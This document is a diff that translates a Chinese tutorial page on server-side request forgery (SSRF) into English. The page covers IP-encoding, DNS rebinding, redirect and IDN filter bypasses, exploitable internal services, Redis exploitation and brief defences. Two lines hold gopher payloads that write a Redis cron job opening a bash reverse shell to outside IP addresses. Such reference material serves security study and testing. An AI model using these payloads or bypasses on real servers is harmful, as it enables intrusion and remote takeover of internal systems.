@@ -1,21 +1,21 @@
 SSRF
 ========================================
 
-简介
+Introduction
 ----------------------------------------
-服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。
+Server Side Request Forgery (SSRF) refers to the attacker using server vulnerabilities to send a constructed request as the server to the intranet where the server is located when the attacker fails to obtain all permissions of the server. SSRF attacks typically target internal systems that are not directly accessible to external networks.
 
-漏洞危害
+Vulnerability hazards
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
+SSRF can perform port scanning on the external network, the internal network where the server is located, and the local area, attack applications running on the internal network or locally, or use the File protocol to read local files.
 
-内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。
+The defense of intranet services is generally weaker than that of external network services. Some intranet services even do not set permission verification for access to the intranet for the convenience of operation and maintenance. Therefore, when SSRF exists, it usually causes greater harm.
 
-利用方式
+Utilization method
 ----------------------------------------
-SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。
+There are many forms of SSRF exploitation and different scenarios, and different exploitation and bypass methods can be used for different scenarios.
 
-以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：
+Taking curl as an example, you can use the dict protocol to operate Redis, the file protocol to read files, and the gopher protocol to bounce Shell. Common payloads are as follows:
 
 :: 
 
@@ -27,158 +27,158 @@ SSRF利用存在多种形式以及不同的场景，针对不同场景可以使�
 
     curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 
 
-相关危险函数
+Relevant hazard function
 ----------------------------------------
-SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 ``file_get_contents()`` / ``fsockopen()`` / ``curl_exec()`` 等。
+The dangerous functions involved in SSRF are mainly network access and support pseudo-protocol network reading. Taking PHP as an example, the functions involved include ``file_get_contents()`` / ``fsockopen()`` / ``curl_exec()``, etc.
 
-过滤绕过
+filter bypass
 ----------------------------------------
 
-更改IP地址写法
+Change the way IP address is written
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：
+Some developers will filter out intranet IPs by regular matching the passed URL parameters, such as using the following regular expression:
 
 - ``^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$``
 - ``^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``
 - ``^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``
 
-对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：
+For this kind of filtering, we use the method of rewriting the IP to bypass it. For example, the IP address 192.168.0.1 can be rewritten as:
 
-- 8进制格式：0300.0250.0.1
-- 16进制格式：0xC0.0xA8.0.1
-- 10进制整数格式：3232235521
-- 16进制整数格式：0xC0A80001
-- 合并后两位：1.1.278 / 1.1.755
-- 合并后三位：1.278 / 1.755 / 3.14159267
+- Octal format: 0300.0250.0.1
+- Hexadecimal format: 0xC0.0xA8.0.1
+- Decimal integer format: 3232235521
+- Hexadecimal integer format: 0xC0A80001
+- Combined last two digits: 1.1.278 / 1.1.755
+- Combined three digits: 1.278 / 1.755 / 3.14159267
 
-另外IP中的每一位，各个进制可以混用。
+In addition, each digit in IP can be mixed in different bases.
 
-访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。
+When accessing the rewritten IP address, Apache will report a 400 Bad Request, but other services such as Nginx and MySQL can still work normally.
 
-另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。
+In addition, the IP address 0.0.0.0 can be directly accessed locally and is usually missed by regular filtering.
 
-使用解析到内网的域名
+Use a domain name that resolves to the intranet
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。
+If the server does not resolve the IP first and then filter the intranet address, we can use localhost to resolve the intranet domain name.
 
-另外 ``xip.io`` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。
+In addition, ``xip.io`` provides a convenient service. The subdomain name of this website will be resolved to the corresponding IP, such as 192.168.0.1.xip.io, which will be resolved to 192.168.0.1.
 
-利用解析URL所出现的问题
+Exploiting problems with parsing URLs
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。
+In some cases, the backend program may parse the accessed URL and filter the parsed host address. At this time, there may be improper parsing of URL parameters, which can bypass filtering.
 
-比如 ``http://www.baidu.com@192.168.0.1/`` 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。
+For example ``http://www.baidu.com@192.168.0.1/`` When the back-end program parses the content of the above URL through incorrect regular expressions (for example, when the character content after http to com, that is, www.baidu.com, is considered to be the host address of the access request), it is very likely that the host of the access URL is www.baidu.com, but in fact the content requested by this URL is the content on 192.168.0.1.
 
-利用跳转
+Use jump
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。
+If the backend server correctly parses the host of the URL and performs filtering after receiving the parameters, we can use a jump to bypass it at this time.
 
-可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。
+You can use services such as http://httpbin.org/redirect-to?url=http://192.168.0.1 to redirect. However, since the URL contains an intranet IP address such as 192.168.0.1, it may be filtered out by regular expressions and can be bypassed by using a short address.
 
-常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。
+Commonly used jumps include 302 jump and 307 jump. The difference is that 307 jump will forward the data in the POST request, etc., but 302 jump will not.
 
-通过各种非HTTP协议
+Via various non-HTTP protocols
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。
+This can be exploited via non-HTTP protocols if the server-side program verifies the protocol used to access the URL.
 
-比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：
+For example, through gopher, you can construct a POST or GET request in a url parameter to achieve the purpose of attacking intranet applications. For example, you can use the gopher protocol to attack the Redis service on the intranet. You can use the following URL:
 
 ::
 
     gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
 
-除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 ``file:///path/to/file`` 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 ``file:///d:/1.txt`` 来访问D盘中1.txt的内容。
+In addition to the gopher protocol, the File protocol is also a commonly used protocol in SSRF. This protocol is mainly used to access files in the local computer. We can access local files on the computer through a format like ``file:///path/to/file``. Using the file protocol can avoid filtering of accessed IPs by the server program. For example, we can access the contents of 1.txt in the D drive through ``file:///d:/1.txt``.
 
 DNS Rebinding
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。
+A common protection idea is: for the URL parameters requested by the user, the server will first perform DNS analysis on it, and then judge the IP address returned by the DNS server. If it is in the blacklist, the request will be prohibited.
 
-但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。
+However, in the whole process, there is a time difference between the first time the DNS service is requested for domain name resolution and the second time the server requests the URL. This time difference can be used to carry out DNS rebinding attacks.
 
-要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：
+To complete the DNS rebinding attack, we need a domain name, and specify the resolution of this domain name to our own DNS Server, write a resolution service on our controllable DNS Server, and set the TTL time to 0. In this way, the attack can be carried out. The complete attack process is:
 
-- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
-- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
-- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
-- 由于已经绕过验证，所以服务器端返回访问内网资源的结果。
+- The server side obtains the URL parameters, performs the first DNS resolution, and obtains a non-intranet IP
+- Judge the obtained IP and if it is found to be a non-blacklisted IP, it will pass the verification.
+- When the server accesses the URL, since the TTL set by the DNS server is 0, DNS resolution is performed again. This time the DNS server returns the intranet address.
+- Since the verification has been bypassed, the server returns the result of accessing intranet resources.
 
-随着 DNS Rebinding 技术不断发展，也有一些新的攻击方式：
+As DNS Rebinding technology continues to develop, there are also some new attack methods:
 
-- 一个响应中，同时回复多个IP请求，包含公网和内网IP
-- 对于浏览器同时请求A记录和AAAA记录的情况，先回复合法的IPv6地址，一段时间后回复内网IPv4地址
+- In one response, reply to multiple IP requests at the same time, including public network and intranet IPs
+- When the browser requests A record and AAAA record at the same time, it will reply to the legal IPv6 address first, and then reply to the intranet IPv4 address after a period of time.
 
-利用IPv6
+Taking advantage of IPv6
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 ``[::]`` ``0000::1`` 或IPv6的内网域名来绕过过滤。
+Some services do not consider IPv6, but if the intranet supports IPv6, you can use IPv6 local IP such as ``[::]`` ``0000::1`` or IPv6 intranet domain name to bypass filtering.
 
 
-利用IDN
+Leveraging IDNs
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。
+Some network access tools such as Curl support internationalized domain names (IDNs). Internationalized domain names, also known as special character domain names, refer to Internet domain names that are partially or completely composed of special characters or letters.
 
-在这些字符中，部分字符会在访问时做一个等价转换，例如 ``ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`` 和 ``example.com`` 等同。利用这种方式，可以用 ``① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩`` 等字符绕过内网限制。
+Among these characters, some characters will be equivalently converted during access, such as ``ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`` and ``example.com`` are equivalent. In this way, you can use characters such as ``① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩`` to bypass intranet restrictions.
 
-可能的利用点
+Possible use points
 ----------------------------------------
 
-内网服务
+Intranet services
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- Apache Hadoop远程命令执行
-- axis2-admin部署Server命令执行
+- Apache Hadoop remote command execution
+- axis2-admin deploys Server command execution
 - Confluence SSRF
-- counchdb WEB API远程命令执行
+- counchdb WEB API remote command execution
 - dict
-- docker API远程命令执行
-- Elasticsearch引擎Groovy脚本命令执行
-- ftp / ftps（FTP爆破）
-- glassfish任意文件读取和war文件部署间接命令执行
+- docker API remote command execution
+- Elasticsearch engine Groovy script command execution
+- ftp/ftps (FTP blasting)
+- glassfish arbitrary file reading and war file deployment indirect command execution
 - gopher
-- HFS远程命令执行
+- HFS remote command execution
 - http、https
-- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） 
-- Java调试接口命令执行
-- JBOSS远程Invoker war命令执行
-- Jenkins Scripts接口命令执行
+- imap/imaps/pop3/pop3s/smtp/smtps (exploit email username and password)
+- Java debugging interface command execution
+- JBOSS remote Invoker war command execution
+- Jenkins Scripts interface command execution
 - ldap
 - mongodb
-- php_fpm/fastcgi 命令执行
-- rtsp - smb/smbs（连接SMB）
+- php_fpm/fastcgi command execution
+- rtsp - smb/smbs (connect SMB)
 - sftp
-- ShellShock 命令执行
-- Struts2 命令执行
+- ShellShock command execution
+- Struts2 command execution
 - telnet
-- tftp（UDP协议扩展）
-- tomcat命令执行
-- WebDav PUT上传任意文件
-- WebSphere Admin可部署war间接命令执行
-- zentoPMS远程命令执行
+- tftp (UDP protocol extension)
+- tomcat command execution
+- WebDav PUT upload any file
+- WebSphere Admin can deploy war to execute indirect commands
+- zentoPMS remote command execution
 
-Redis利用
+Redis utilization
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- 写ssh公钥
-- 写crontab
-- 写WebShell
-- Windows写启动项
-- 主从复制加载 .so 文件
-- 主从复制写无损文件
+- Write ssh public key
+- write crontab
+-Write WebShell
+- Windows write startup items
+- Master-slave copy loading .so file
+- Master-slave copy and write lossless files
 
-云主机
+Cloud host
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。
+In cloud environments such as AWS and Google, by accessing the metadata API or management API of the cloud environment, sensitive information and other effects can be achieved in some cases.
 
-防御方式
+defense mode
 ----------------------------------------
-- 过滤返回的信息
-- 统一错误信息
-- 限制请求的端口
-- 禁止不常用的协议
-- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单
+- Filter the returned information
+- Unify error messages
+- Limit requested ports
+- Ban uncommon protocols
+- For DNS Rebinding, consider using DNS cache or Host whitelist
 
-参考链接
+Reference link
 ----------------------------------------
-- `SSRF漏洞分析与利用 <http://www.91ri.org/17111.html>`_
+- `SSRF vulnerability analysis and utilization <http://www.91ri.org/17111.html>`_
 - `A New Era Of SSRF <https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>`_
 - `php ssrf technique <https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51>`_
-- `谈一谈如何在Python开发中拒绝SSRF漏洞 <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
+- `Talk about how to deny SSRF vulnerabilities in Python development <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
 - `SSRF Tips <http://blog.safebuff.com/2016/07/03/SSRF-Tips/>`_
 - `SSRF in PHP <https://joychou.org/web/phpssrf.html>`_
